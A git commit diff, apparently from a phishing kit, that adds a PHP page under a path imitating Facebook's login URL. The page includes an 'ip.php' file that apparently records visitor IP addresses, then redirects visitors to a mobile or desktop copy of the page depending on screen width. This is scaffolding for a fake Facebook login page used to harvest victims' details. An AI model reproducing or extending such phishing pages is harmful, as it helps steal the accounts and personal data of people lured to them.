22d5dea540a439b23e7f4e0f13c4e428d3b3c299
edgarluck <76820660+edgarluck@users.noreply.github.com>
2022-02-21 08:57:15 -0500

    Add files via upload

---
+++ .luck/www.facebook.com/login/web/index.php
@@ -0,0 +1,10 @@
+<?php include 'ip.php';?>
+<script type="text/javascript">
+if (screen.width <= 699){
+  document.location = "mobile.html";
+}
+else {
+  document.location = "index.html";
+}
+</script>
+
